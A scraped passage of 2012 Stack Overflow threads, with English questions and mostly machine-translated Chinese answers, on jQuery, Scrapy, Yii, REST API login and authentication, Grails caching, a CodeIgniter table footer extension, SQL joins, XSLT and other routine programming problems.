I dont understand since I covered both "parent categories" (current-menu-item.parent and current-portfolio-ancestor) in the jQuery?

Any ideas?

```
$('.current-menu-item').parent('.sub-menu').css('visibility', 'visible');
$('.current-menu-item.parent, .current-portfolio-ancestor').find('.sub-menu').css('visibility', 'visible'); 
```

The whole jQuery code [here](http://wptemp.site90.net/wp-content/themes/mulders-vandenberk/js/script.js?ver=3.5)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:22:52.360

用你的两行替换

```
$('.current-menu-parent').parent().css('visibility', 'visible'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:14:57.173

上`http://wptemp.site90.net/portfolio/publicatie-test-b/`，此行没有`.current-menu-item`您在以下代码中使用的任何 CSS 类（例如）`script.js`：

```
<li id="menu-item-102" class="menu-item menu-item-type-post_type menu-item-object-page parent menu-item-102"> 
```

因此，可见性仍然是隐藏的。

# python - How can I get the response from the Request in Scrapy?

> ID：13916612
> 
> 赞同：3
> 
> 时间：2012-12-17T15:04:59.853
> 
> 标签：python, scrapy

Is there any way that I can get the `response.body` from the Request function in scrapy?

I have this:

```
request = Request("http://www.example.com",  callback = self.mytest)

def mytest(self, response)
     return response.body 
```

Now I want to get `response.body` in a Python variable, How can I get that?

I want something like

`myresponse = Request("http://www.example.com").get('response')`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-27T18:17:33.603

*有没有办法从您刚刚创建的请求中获取响应？* 不，只有回调函数可以访问响应。进入回调后，您可以通过 response.request 访问请求，但反之则不行。

# search - yii How to compare foregin key

> ID：13916619
> 
> 赞同：0
> 
> 时间：2012-12-17T15:05:09.550
> 
> 标签：search, yii

I am currently in admin view consisitng of a table with foregin keys. Thes FK I have magaed to lookup and display the content of the key. I am trying to compare using the lookup values of the FK and not the FK id. The following is what I have but is not fully working but does give me some results. I need to compare `lead_desc` which is stored in the main table using FK and bring back all `LIKE` values.

```
public function search()
    {
        // Warning: Please modify the following code to remove attributes that
        // should not be searched.

        $criteria=new CDbCriteria;

        $criteria->compare('leads_id',$this->leads_id);
        $criteria->compare('date_of_entry',$this->date_of_entry,true);
        $criteria->compare('lead_input',$this->lead_input,true);
        $criteria->compare('account_name',$this->account_name,true);
        //$criteria->compare('lead_desc',$this->lead_desc);

        if(  !empty($this->lead_desc) && is_string($this->lead_desc)){

            $match = addcslashes($this->lead_desc, '%_'); // escape LIKE's special characters       
            $sub_criteria = new CDbCriteria;
            $sub_criteria->condition = "name LIKE :match";
            $sub_criteria->params = array(":match" =>  "%$match%" );

            $row = LeadDesc::model()->findAll($sub_criteria);
            $arr = array(); //no tused
            if($row){
                foreach ($row as $key => $value) {              
                    $arr[$value->lead_desc_id] = $value->name; //not used
                    //collect all records in leads table and merge with current search
                    $criteria->compare('lead_desc',$value->lead_desc_id,true,'OR');                 
                }
                //print_r($arr);
                //exit();

                //$criteria->mergewith
            }else{ 
                $this->lead_desc = null;
            }

        }

        $criteria->compare('size',$this->size,true);
        $criteria->compare('lead_source',$this->lead_source);
        $criteria->compare('country',$this->country);
        $criteria->compare('region',$this->region);
        $criteria->compare('date_of_activity',$this->date_of_activity,true);

        //$criteria->compare('status',$this->status);
        if( !empty($this->status) && is_string($this->status)){
            $sub_criteria = new CDbCriteria;
            $sub_criteria->condition = "(name = :name)";
            $sub_criteria->params = array(":name" =>  trim($this->status) );

            // Get fixed asset id via asset number
            $row = Status::model()->find($sub_criteria);
            if($row){
                $criteria->compare('status',$row->status_id);
                $this->status = $row->name;
            }else{ 
                $this->status = null;
            }
        }

        $criteria->compare('assigned',$this->assigned);
        $criteria->compare('sales',$this->sales,true);
        $criteria->compare('comments',$this->comments,true);

        return new CActiveDataProvider($this, array(
            //'criteria'=>$criteria,
            'criteria'=>$criteria,
            'sort'=>array(
                    'defaultOrder'=>'leads_id DESC'
            ),
            'pagination'=>array(
                    'pageSize'=>15,
            ),
        ));
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T13:43:03.607

像这样：

```
$criteria->with=array('related_model');
$criteria->compare('related_model.field',$this->related_model); 
```

请记住，您需要正确配置模型关系： [http ://www.yiiframework.com/doc/guide/1.1/en/database.arr](http://www.yiiframework.com/doc/guide/1.1/en/database.arr)

# design-patterns - REST API 登录模式

> ID：13916620
> 
> 赞同：196
> 
> 时间：2012-12-17T15:05:14.797
> 
> 标签：design-patterns, rest

我正在创建一个 REST api，紧跟 apigee 建议，使用名词而不是动词，api 版本烘焙到 url，每个集合两个 api 路径，GET POST PUT DELETE 用法等。

我正在开发登录系统，但不确定登录用户的正确 REST 方式。我目前不在安全方面工作，只是登录模式或流程。（稍后我们将添加 2 步 oAuth，使用 HMAC 等）

可能的选项

*   一个类似的帖子 `https://api...com/v1/login.json`
*   一个 PUT 到类似的东西`https://api...com/v1/users.json`
*   我没有想到的东西......

登录用户的正确 REST 样式是什么？

* * *

## 回答 #1

> 赞同：146
> 
> 时间：2012-12-25T13:31:05.233

[Roy T. Fielding 和 Richard N. Taylor 的现代 Web 架构的原则设计](http://www.ics.uci.edu/~fielding/pubs/webarch_icse2000.pdf)，即来自所有 REST 术语的一系列作品，包含客户端-服务器交互的定义：

> 所有 REST 交互都是***无状态***的。也就是说，每个***请求都包含连接器理解请求所需的所有信息，与之前可能出现的任何请求无关***。

这个限制完成了四个功能，第一个和第三个在这种特殊情况下很重要：

*   *第一*：它**消除了连接器在请求之间保留应用程序状态的任何需要**，从而减少了物理资源的消耗并提高了可扩展性；
*   *第三*：它允许中介单独查看和**理解请求**，这在动态重新排列服务时可能是必要的；

现在让我们回到您的安全案例。每个请求都应包含所有必需的信息，授权/身份验证也不例外。如何做到这一点？从字面上看，每次请求都会通过电线发送所有必需的信息。

如何存档的示例之一是[**基于哈希的消息身份验证代码**或**HMAC**](http://en.wikipedia.org/wiki/Hash-based_message_authentication_code)。在实践中，这意味着向每个请求添加当前消息的哈希码。*由密码散列函数*结合*秘密密钥*计算的散列码。*加密哈希函数*要么是预定义的，要么是*按需代码*REST 概念的一部分（例如 JavaScript）。*秘密密钥* 应该由服务器作为资源提供给客户端，客户端使用它来计算每个请求的哈希码。

**HMAC**实现的例子有很多，但我希望你注意以下三个：

*   [对 Amazon Simple Storage Service (Amazon S3) 的 REST 请求进行身份验证](http://s3.amazonaws.com/doc/s3-developer-guide/RESTAuthentication.html)
*   [Mauriceless 回答问题：“如何在 RESTful WCF API 中实现 HMAC 身份验证”](https://stackoverflow.com/a/8366526/443366)
*   [crypto-js：标准和安全加密算法的 JavaScript 实现](http://code.google.com/p/crypto-js/#Progressive_HMAC_Hashing)

## 在实践中如何运作

如果客户端知道密钥，那么它就可以使用资源进行操作了。否则他会被临时重定向（状态码307 Temporary Redirect）授权并获取秘钥，然后重定向回原来的资源。在这种情况下，*无需事先知道（即在某处硬编码）授权客户端的 URL 是什么*，并且可以随时间调整此模式。

希望这将帮助您找到正确的解决方案！

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2012-12-19T17:18:32.827

**TL;DR**每个请求的登录不是实现 API 安全性的必需组件，身份验证是。

如果不谈论一般的安全性，很难回答您有关登录的问题。使用一些身份验证方案，没有传统的登录。

REST 没有规定任何安全规则，但实践中最常见的实现是具有 3 路身份验证的 OAuth（正如您在问题中提到的那样）。本身没有登录，至少每个 API 请求都没有。使用 3-way auth，您只需使用令牌。

1.  用户批准 API 客户端并授予以长期令牌形式发出请求的权限
2.  Api 客户端通过使用长寿命令牌来获取短寿命令牌。
3.  Api 客户端随每个请求发送短期令牌。

该方案为用户提供了随时撤销访问权限的选项。我见过的几乎所有公开可用的 RESTful API 都使用 OAuth 来实现这一点。

我只是不认为您应该在登录方面提出您的问题（和问题），而应该考虑总体上保护 API。

有关一般 REST API 身份验证的更多信息，您可以查看以下资源：

*   [http://www.infoq.com/news/2010/01/rest-api-authentication-schemes](http://www.infoq.com/news/2010/01/rest-api-authentication-schemes)
*   [REST API 身份验证](https://stackoverflow.com/questions/7999295/rest-api-authentication)
*   [RESTful API 身份验证](https://stackoverflow.com/questions/7606559/restful-api-authentication)

* * *

## 回答 #3

> 赞同：26
> 
> 时间：2012-12-17T16:05:30.140

REST 哲学的很大一部分是在设计 API 时尽可能多地利用 HTTP 协议的标准特性。将该理念应用于身份验证，客户端和服务器将利用 API 中的标准 HTTP 身份验证功能。

登录屏幕非常适合人类用户用例：访问登录屏幕，提供用户/密码，设置 cookie，客户端在所有未来请求中提供该 cookie。不能期望使用 Web 浏览器的人为每个单独的 HTTP 请求提供用户 ID 和密码。

但是对于 REST API，登录屏幕和会话 cookie 并不是绝对必要的，因为每个请求都可以包含凭据而不会影响人类用户；如果客户在任何时候不配合，`401`都可以给出“未经授权”的回应。 [RFC 2617](https://www.rfc-editor.org/rfc/rfc2617)描述了 HTTP 中的身份验证支持。

TLS (HTTPS) 也是一种选择，它允许在每个请求中通过验证另一方的公钥对客户端进行身份验证（反之亦然）。此外，这确保了获得奖金的渠道。当然，为此需要在通信之前进行密钥对交换。（注意，这专门用于使用 TLS 识别/验证用户。使用 TLS / Diffie-Hellman 保护通道始终是一个好主意，即使您不通过其公钥识别用户。）

一个示例：假设 OAuth 令牌是您的完整登录凭据。一旦客户端获得了 OAuth 令牌，它就可以作为标准 HTTP 身份验证中的用户 ID 提供给每个请求。服务器可以在第一次使用时验证令牌，并缓存检查结果以及随每个请求更新的生存时间。`401`如果未提供，任何需要身份验证的请求都会返回。

# ruby-on-rails - Rails named route for non-id parameter

> ID：13916624
> 
> 赞同：0
> 
> 时间：2012-12-17T15:05:24.793
> 
> 标签：ruby-on-rails, routing

I am using a non-id parameter in one of my routes like so:

```
get 'users/:attribute' => 'users#special_action', :as => named_route 
```

I like the named route thingy and I hoped I can just do:

```
named_route_url(@user) 
```

To get a url, where the `:attribute` part gets replaced by `user.attribute`.

To my surprise, routing used what `User.to_param` provides.

While I can understand that this is a convention, I would like to know if there is a way to say I want to specificaly use attribute `x` in my route.

(Example of scenatio, where that might be of benefit is if I want to rename the attribute, but keep the route, I can just rename it in the route.)

# caching - 在 Grails 中缓存？

> ID：13916626
> 
> 赞同：2
> 
> 时间：2012-12-17T15:05:30.480
> 
> 标签：caching, grails, browser-cache, grails-2.0

对于用 grails 实现缓存的好方法，是否有类似的最佳实践？应该使用哪些插件，应该缓存页面的哪些部分以及如何缓存？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-17T16:27:57.197

取决于您的需求的大量问题。要缓存域对象，您可以使用 Hibernate 缓存，如下所示：

```
class Book {
    …
    static mapping = {
        cache true
    }
} 
```

并在以下位置配置 Hibernate 二级缓存`grails-app/conf/DataSource.groovy`：

```
hibernate {
    cache.use_second_level_cache=true
    cache.use_query_cache=true
    cache.provider_class='org.hibernate.cache.EhCacheProvider'
} 
```

[Grails 文档](http://grails.org/doc/latest/ref/Database%20Mapping/cache.html)和[缓存指南](http://grails.org/doc/2.1.0/guide/single.html#caching)。

您还可以使用基于[Spring 缓存的](http://static.springsource.org/spring/docs/3.1.x/spring-framework-reference/html/cache.html)[Grails 缓存插件](http://grails.org/plugin/cache)缓存您的控制器和服务：

```
@Cacheable('message')
   Message getMessage(String title) {
      println 'Fetching message'
      Message.findByTitle(title)
   } 
```

您会在[此处](http://grails-plugins.github.com/grails-cache/)找到出色的文档。

如果您想缓存渲染页面，您还可以查看[gsp 模板渲染缓存插件](http://grails.org/plugin/template-cache)。

# jquery - jQuery File Upload preview selected files

> ID：13916628
> 
> 赞同：1
> 
> 时间：2012-12-17T15:05:44.630
> 
> 标签：jquery, file-upload, symfony

i have a form and i need multiple file upload and i start with basic plugin from jQuery File Upload. However im trying to acomplish the preview thing that demo shows, and i have been reading the docs like [https://github.com/blueimp/jQuery-File-Upload/wiki/Template-Engine](https://github.com/blueimp/jQuery-File-Upload/wiki/Template-Engine) and folow the code but my preview doesnt work at all and i dont know what am i missing. My code looks like this:

```
<a href="#" id="upload">upload files</a>
<input style="visibility: hidden;" id="fileupload" type="file" name="files[]" data-url="{{ asset('/bundles/testetestebundleblueimp/js/jQuery-file-upload/server/php/index.php') }}" multiple>
<input type="button" value="upload" id="upload-files"/>

<table role="presentation" class="table table-striped"><tbody class="files"></tbody></table> 
```

now the script:

```
$('#upload').live('click', function(){
        $('#fileupload').click();
        return false;       
   });

$(function () {   
    $('#fileupload').fileupload({
        dataType: 'json',
        autoUpload : false,
        uploadTemplateId: null,
        downloadTemplateId: null,
        uploadTemplate: function (o) {
        var rows = $();
        $.each(o.files, function (index, file) {
            var row = $('<tr class="template-upload fade">' +
                '<td class="preview"><span class="fade"></span></td>' +
                '<td class="name"></td>' +
                '<td class="size"></td>' +
                (file.error ? '<td class="error" colspan="2"></td>' :
                        '<td><div class="progress">' +
                            '<div class="bar" style="width:0%;"></div></div></td>' +
                            '<td class="start"><button>Start</button></td>'
                ) + '<td class="cancel"><button>Cancel</button></td></tr>');
            row.find('.name').text(file.name);
            row.find('.size').text(o.formatFileSize(file.size));
            if (file.error) {
                row.find('.error').text(
                    locale.fileupload.errors[file.error] || file.error
                );
            }
            rows = rows.add(row);
        });
        return rows;
    },
        done: function (e, data) {
            alert('done');
        },
        add : function(e, data) {
            $.each(data.files, function (index, file) {
                    console.log('Added file: ' + file.name);
            });            
            $("#upload-files").on("click", function() {
                   $('#progress .bar').show();                    
                   data.submit();
                   $("#upload-files").off("click");
            });
        }            
    });
}); 
```

My Goal here is to allow user to select files and preview them in a container. When the user click on "upload-files" i want to send all files that are in the container, just like the demo.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T12:41:52.873

您缺乏各种数据/资源。

看看这里。

![模板](../Images/957cae29cbc307d505369e8fe5635a2c.png)

![脚本](../Images/463431b1814e02317864438825fc9fb7.png)

意味着您需要的不仅仅是 jsfiddle。

现在，因为我无法将文件上传到某个位置，所以无法进一步测试。我使用 jsfiddle 收到错误消息，但我确定您可能有自己的服务器位置要上传到。

**更新**
由于某种原因，您的功能`data.files[index].thumbnail_url`中没有设置`add`。
我得到的唯一方法是滥用`file.name`财产：

```
add : function(e, data) {

    console.dir( arguments );

    $.each(data.files, function (index, file) {
        console.log(file, file.thumbnail_url);
        console.log('Added file: ' + file.name);
        document.body.innerHTML += '<img src="server/php/files/' + file.name + '">';
    });

    $("#upload-files").on("click", function() {
        $('#progress .bar').show();                    
        data.submit();
        $("#upload-files").off("click");
    });
} 
```

# java - Cannot override abstract method of superclass when subclass is in another package

> ID：13916629
> 
> 赞同：1
> 
> 时间：2012-12-17T15:05:45.580
> 
> 标签：java, android, inheritance, android-library

I have this **public abstract class MyClass** with abstract method **abstract public void myMethod()** in my Android library project.

I am trying to build a concrete implementation of this class in another project, which is an application project and references the library project. The method implementation in the subclass is marked with "@Override" and Eclipse gives me the following error:

> The method myMethod() of type MySubClass must override or implement a supertype method

I remove "@Override" and error becomes a warning:

> The method MySubClass.myMethod() does not override the inherited method from MyClass since it is private to a different package

What does this mean? Yes, these classes are in different projects and different packages but what does this have to do with inheritance? Both methods are public.

Here is the code for the superclass:

```
package com.emret.myPackage;

//Some imports here

public abstract class ThingsProvider {

//Class code here

    abstract public void createThings();

} 
```

Here is the subclass:

```
package com.emret.myPackage.subPackage;

//Some imports here

public class SmallThingsProvider extends ThingsProvider {

//Class code here

    @Override
    public void createThings() {
        createThing(0, R.drawable.cat, R.raw.cat);
        createThing(1, R.drawable.dog, R.raw.dog);
        createThing(2, R.drawable.cow, R.raw.cow);
        createThing(3, R.drawable.sheep, R.raw.goat);
        createThing(4, R.drawable.bicycle, R.raw.bicycle);
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:33:54.557

似乎“yshavits”指出了确切的痛点，但其他限制阻碍了。

我的抽象方法一开始是包私有的。我在子类中遇到错误时将其更改为public，但将其更改为public后错误并没有消失。

事实证明，只要引用的项目被完整且成功地编译，引用项目中的引用就不会更新。引用项目中的任何单个错误都会阻止成功编译，并阻止引用项目检测其更新的类信息。

我引用的项目有另一个错误。即使与上面的类完全分开，它也会阻止成功编译并阻止引用项目中的引用更新。

后台编译器并不像我希望的那样聪明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:28:15.407

我认为您使用的是 Java 1.5，请转到项目/属性，Java 编译器并确保您至少使用 Java 1.6。

# c - How to put the characters from a File in to a char string?

> ID：13916630
> 
> 赞同：0
> 
> 时间：2012-12-17T15:05:48.700
> 
> 标签：c, readfile, file-copying

So here is my attempt at it but I'm getting a few errors which I don't know how to fix. 17.2 Warning : passing argument 2 of putc makes pointer from integer without a cast. C:\mingw ....... note expected Struct FILE* but' but argument is of type int.

```
 #include <stdio.h>
  #include <stdlib.h>

  int main (void) {
FILE *fp;
int c;
char copywords;

fp = fopen("gues20.txt", "r");
if (fp == NULL)
exit(1);

c = getc(fp);
while(c != EOF)
{
putc(c, copywords);
c = getc(fp);
}
printf("%d", copywords);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T15:08:14.293

**[putc](http://www.kernel.org/doc/man-pages/online/pages/man3/fputc.3.html)**的第二个参数是文件流。但是你通过了一个简单的字符。利用：

```
while(c != EOF)
{
putc(c, stdout);
c = getc(fp);
} 
```

在标准输出中打印。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:08:45.150

这个：

```
putc(c, copywords); 
```

是错的。首先，`copywords`从不在此行之上初始化或使用，因此引用它显然是错误的。二、原型`putc()`为：

```
int putc(int c, FILE *stream); 
```

这解释了您的编译器警告。

# sql - SQL join 3 table

> ID：13916638
> 
> 赞同：0
> 
> 时间：2012-12-17T15:06:29.497
> 
> 标签：sql, sql-server-2008, join, left-join

i m using SQL 2008 R2

i got duplicate value from my join table: ![Join Table](../Images/b86e7d934c0bf94be378131a8af1ad9c.png)

```
SELECT *
FROM LETTRE_VOIT 
 LEFT JOIN FAWEB_CLIENT ON FAWEB_CLIENT.CODE_CLIENT = LETTRE_VOIT.CODE_CLIENT
 LEFT  JOIN ORDRE ON ORDRE.CODE_DEST = LETTRE_VOIT.CODE_DEST AND ORDRE.CODE_CLIENT = LETTRE_VOIT.CODE_CLIENT
   AND ORDRE.DATE_CLOTUR = LETTRE_VOIT.DATE_CLOTURE
WHERE  LETTRE_VOIT.NO_ORDRE IN ('5530','5533') 
```

as you can see on image i got double value of 5530 and 5533.

my table FAWEB_CLIENT with ID Code_Client
table LETTRE_VOIT with ID NOID and NO_ORDRE
table ORDRE with ID NO_ORDRE and NO_CLIENT

i can not use DISTINCT: ![Distinct](../Images/006d8c44ce871370a5019085fb8b69ff.png) error message: The text data type can not be selected as DISTINCT because it is not comparable

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:18:46.947

我怀疑问题是您的联接不正确。我的怀疑是您缺少以下连接条件`Letter_Voit.No_Ordre`：

```
SELECT *
FROM LETTRE_VOIT 
 LEFT JOIN FAWEB_CLIENT ON FAWEB_CLIENT.CODE_CLIENT = LETTRE_VOIT.CODE_CLIENT
 LEFT  JOIN ORDRE ON ORDRE.CODE_DEST = LETTRE_VOIT.CODE_DEST AND ORDRE.CODE_CLIENT = LETTRE_VOIT.CODE_CLIENT
   AND ORDRE.DATE_CLOTUR = LETTRE_VOIT.DATE_CLOTURE and
   LETTRE_VOIT.No_ORDRE = Order.No_ORDRE
WHERE  LETTRE_VOIT.NO_ORDRE IN ('5530','5533') 
```

您也许可以删除其他一些可能变得多余的连接条件。

# wso2 - wso2 governance email templates

> ID：13916640
> 
> 赞同：0
> 
> 时间：2012-12-17T15:06:41.303
> 
> 标签：wso2, email-templates

We have gotten WSO2 governance registry to send e-mails successfully. Now we want to template the emails that are being sent out.

There is a sample at : [http://docs.wso2.org/wiki/display/Governance450/Notification+E-mail+Customization+Sample](http://docs.wso2.org/wiki/display/Governance450/Notification+E-mail+Customization+Sample)

This allows you to alter the text coming through the event but is there an easier way that writing Java code? We cannot compile the sample anyway as the Maven compiler keeps looking up the references files and errors with checksum validation failed.

Thanks

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:55:40.940

您需要创建一个处理程序来更改电子邮件模板，因此需要有一些 Java 代码。您可以使用[WSO2 Developer Studio](http://dist.wso2.org/products/developer-studio/2.1.0/docs/registry_category.html#RegistryHandler)来简化该过程。

# django - mod_wsgi memory usage

> ID：13916641
> 
> 赞同：1
> 
> 时间：2012-12-17T15:06:50.933
> 
> 标签：django, apache, mod-wsgi

We are serving over 100 sites with mod_wsgi process 2 thread 4 configuration. Apache memory usage pushes limits of 15GB in this point how accurate to use mod_wsgi?

Anybody had tried other alternatives in a similar situation?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T22:43:18.997

我更喜欢将 fastcgi 用于多用户站点。您可以在用户之间获得更好的分离——独立的进程、不同的用户 ID、更好的资源分配——我只需运行“top”来确定今天哪个客户的服务器被滥用了。

# codeigniter - 如何将 tfoot 行添加到使用 codeigniter 表类生成的表中

> ID：13916646
> 
> 赞同：1
> 
> 时间：2012-12-17T15:07:06.513
> 
> 标签：codeigniter

我想将页脚行添加到 CI 表类生成的表中。有一些类可以扩展表类并添加此功能。如果可用，我宁愿使用本机功能而不扩展表类。

是否可以在 CI 表类中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-18T11:11:04.677

我最终在表格下方放置了一个具有类似格式的 div，以提供页脚行的错觉。希望将来 table 类将包括 tfoot 功能。

我知道扩展类会将此功能添加到 CI 表类中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-20T02:52:23.700

这是一个老问题，但我刚刚遇到了同样的问题，这是修改后的表格库，允许表格页脚

[https://github.com/rhspeer/TableWithTableFooter](https://github.com/rhspeer/TableWithTableFooter)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-07-29T01:45:43.563

我确实扩展了 table 类，我还将模板设置为默认使用 jquery ui，并且与上面的示例不同，我不重新创建不需要更新的基本方法。

在应用程序/库中添加一个名为 MY_table.php 的文件

```
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
class MY_Table extends CI_Table{
var $footer = array();
function __construct()
{
    parent::__construct();
    $this->template = array(
        'table_open'            => '<table class="ui-corner-top ui-widget" >',

        'thead_open'            => '<thead class="ui-widget-header">',
        'thead_close'           => '</thead>',
        'heading_row_start'     => '<tr>',
        'heading_row_end'       => '</tr>',
        'heading_cell_start'    => '<th>',
        'heading_cell_end'      => '</th>',

        'tbody_open'            => '<tbody class="ui-widget-content">',
        'tbody_close'           => '</tbody>',

        'row_start'             => '<tr class="table_row_odd">',
        'row_end'               => '</tr>',
        'cell_start'            => '<td>',
        'cell_end'              => '</td>',

        'row_alt_start'         => '<tr class="table_row_even">',
        'row_alt_end'           => '</tr>',
        'cell_alt_start'        => '<td>',
        'cell_alt_end'          => '</td>',

        'tfoot_open'            => '<tfoot class="ui-widget-header ui-priority-secondary">',
        'footer_row_start'      => '<tr>',
        'footer_row_end'        => '</tr>',
        'footer_cell_start'     => '<th>',
        'footer_cell_end'       => '</th>',
        'tfoot_close'           => '</tfoot>',

        'table_close'           => '</table>'
    );
    $this->empty_cells = '&nbsp;';
}
function set_template($template)
{
    // extends the normal method so that only the required elements have to be entered.  the remainder stay as defaults.
    if ( ! is_array($template))
    {
        return FALSE;
    }
    else
    {
        foreach($template as $param => $value)
        {
            $this->template[$param] = $value;
        }
    }

}
function set_footer()
{
    $args = func_get_args();
    $this->footer = $this->_prep_args($args);
}
function clear()
{
    $this->footer = array();
    parent::clear();
}
// extend the generate table method.  just adds the bit in to handle tfoot.

function generate($table_data = NULL)
{
    // The table data can optionally be passed to this function
    // either as a database result object or an array
    if ( ! is_null($table_data))
    {
        if (is_object($table_data))
        {
            $this->_set_from_object($table_data);
        }
        elseif (is_array($table_data))
        {
            $set_heading = (count($this->heading) == 0 AND $this->auto_heading == FALSE) ? FALSE : TRUE;
            $this->_set_from_array($table_data, $set_heading);
        }
    }

    // Is there anything to display?  No?  Smite them!
    if (count($this->heading) == 0 AND count($this->rows) == 0)
    {
        return 'Undefined table data';
    }

    // Compile and validate the template date
    $this->_compile_template();

    // set a custom cell manipulation function to a locally scoped variable so its callable
    $function = $this->function;

    // Build the table!

    $out = $this->template['table_open'];
    $out .= $this->newline;

    // Add any caption here
    if ($this->caption)
    {
        $out .= $this->newline;
        $out .= '<caption>' . $this->caption . '</caption>';
        $out .= $this->newline;
    }

    // Is there a table heading to display?

    if (count($this->heading) > 0)
    {
        $out .= $this->template['thead_open'];
        $out .= $this->newline;
        $out .= $this->template['heading_row_start'];
        $out .= $this->newline;

        foreach ($this->heading as $heading)
        {
            $temp = $this->template['heading_cell_start'];

            foreach ($heading as $key => $val)
            {
                if ($key != 'data')
                {
                    $temp = str_replace('<th', "<th $key='$val'", $temp);
                }
            }

            $out .= $temp;
            $out .= isset($heading['data']) ? $heading['data'] : '';
            $out .= $this->template['heading_cell_end'];
        }

        $out .= $this->template['heading_row_end'];
        $out .= $this->newline;
        $out .= $this->template['thead_close'];
        $out .= $this->newline;
    }
    if (count($this->footer) > 0)
    {
        $out .= $this->template['tfoot_open'];
        $out .= $this->newline;
        $out .= $this->template['footer_row_start'];
        $out .= $this->newline;

        foreach ($this->footer as $footer)
        {
            $temp = $this->template['footer_cell_start'];

            foreach ($footer as $key => $val)
            {
                if ($key != 'data')
                {
                    $temp = str_replace('<th', "<th $key='$val'", $temp);
                }
            }

            $out .= $temp;
            $out .= isset($footer['data']) ? $footer['data'] : '';
            $out .= $this->template['footer_cell_end'];
        }

        $out .= $this->template['footer_row_end'];
        $out .= $this->newline;
        $out .= $this->template['tfoot_close'];
        $out .= $this->newline;
    }

    // Build the table rows
    if (count($this->rows) > 0)
    {
        $out .= $this->template['tbody_open'];
        $out .= $this->newline;

        $i = 1;
        foreach ($this->rows as $row)
        {
            if ( ! is_array($row))
            {
                break;
            }

            // We use modulus to alternate the row colors
            $name = (fmod($i++, 2)) ? '' : 'alt_';

            $out .= $this->template['row_'.$name.'start'];
            $out .= $this->newline;

            foreach ($row as $cell)
            {
                $temp = $this->template['cell_'.$name.'start'];

                foreach ($cell as $key => $val)
                {
                    if ($key != 'data')
                    {
                        $temp = str_replace('<td', "<td $key='$val'", $temp);
                    }
                }

                $cell = isset($cell['data']) ? $cell['data'] : '';
                $out .= $temp;

                if ($cell === "" OR $cell === NULL)
                {
                    $out .= $this->empty_cells;
                }
                else
                {
                    if ($function !== FALSE && is_callable($function))
                    {
                        $out .= call_user_func($function, $cell);
                    }
                    else
                    {
                        $out .= $cell;
                    }
                }

                $out .= $this->template['cell_'.$name.'end'];
            }

            $out .= $this->template['row_'.$name.'end'];
            $out .= $this->newline;
        }

        $out .= $this->template['tbody_close'];
        $out .= $this->newline;
    }

    $out .= $this->template['table_close'];

    // Clear table class properties before generating the table
    $this->clear();
    return $out;
} 
```

}

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-17T15:35:46.637

我想这是你在寻找什么

[https://github.com/EllisLab/CodeIgniter/wiki/Table](https://github.com/EllisLab/CodeIgniter/wiki/Table)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-12-02T16:17:48.503

不需要扩展表库，你可以使用`set_template`函数，传递数组模板。

# ruby-on-rails - rspec with format and drb

> ID：13916648
> 
> 赞同：0
> 
> 时间：2012-12-17T15:07:18.287
> 
> 标签：ruby-on-rails, rspec, rspec2, rspec-rails

I can't get rspec to run with --format option AND --drb, is there a way to make this work?

I am running rspec spec --format documentation --drb

and get the error

wrong number of arguments (0 for 1) (ArgumentError)

if I run rspec spec --format documentation

it runs fine

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-23T02:24:40.360

我已经成功了`$ rspec --drb --format documentation spec/`。

# xml - XSLT 帮助 - 重复数据（第 2 部分）

> ID：13916649
> 
> 赞同：1
> 
> 时间：2012-12-17T15:07:20.663
> 
> 标签：xml, xslt, xslt-2.0, transformation, repeat

我在[这里](https://stackoverflow.com/questions/13569768/xslt-assistance-repeating-data)问了一个类似的问题，该问题已解决。

但是，我发现我还面临一个问题，即数据显示如下，而不是将标头值包含在 XML 标记中。

```
<results>
<body>
<line>
  <a>Column 1 Customer Name</a>
  <a>Column 2 Customer Add</a>
  <a>Column3</a>
  <a>Column4</a>
</line>
<line>
    <a>Data1</a>
    <a>Data2</a>
    <a>Data3</a>
    <a>Data4</a>
</line>
<line>
    <a>Data1</a>
    <a>Data2</a>
    <a>Data3</a>
    <a>Data4</a>
</line>
</body>
</results> 
```

我设法找到了一种方法（XSLT 外部）来区分这两种类型，但需要达到相同的结果，如下所示。

```
<?xml version="1.0"?>
<results>
<header>
<a>Column 1 Customer Name</a>
<a>Column 2 Customer Add</a>
<a>Column3</a>
<a>Column4</a>
</header>
<body>
<line>
    <Column1CustomerName>Data1</Column1CustomerName>
    <Column2CustomerAdd>Data2</Column2CustomerAdd>
    <Column3>Data3</Column3>
    <Column4>Data4</Column4>
</line>
<line>
    <Column1CustomerName>Data1</Column1CustomerName>
    <Column2CustomerAdd>Data2</Column2CustomerAdd>
    <Column3>Data3</Column3>
    <Column4>Data4</Column4>
</line>
</body>
</results> 
```

行数可以不受限制，但“标题”始终是第一行。我有关于我需要如何做到这一点的理论，通过

```
<xsl:template match="/results/body/line[0]"> 
```

然而，这就是我所拥有的。

我在想完成将这些数据移动到标签“标题”可能更容易，这样我就可以按照我提出的另一个问题执行转换器，但不知道这是a）最好的方法，还是b ） 可能的？

作为一个额外的问题，是否可以将这两种方法放在一个 XSLT 中？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:33:30.363

```
<xsl:stylesheet version="2.0"   xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
